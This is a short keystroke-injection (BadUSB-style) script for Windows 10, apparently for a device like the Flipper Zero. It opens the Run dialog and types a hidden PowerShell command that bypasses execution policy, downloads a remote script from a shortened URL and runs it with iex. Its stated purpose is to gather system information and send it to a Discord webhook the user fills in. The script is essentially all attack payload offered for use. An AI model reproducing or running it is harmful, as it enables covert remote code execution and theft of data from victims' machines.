// Title: beigeworm's system information to discord webhook 
// Author: @beigeworm
// Description: This script gathers system information and posts to a discord webhook address with the results.
// Target: Windows 10
// *SETUP*
// replace DISCORD_WEBHOOK_HERE with your Discord Webhook.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/bw_info_to_dc | iex");
delay(500);
press("ENTER");
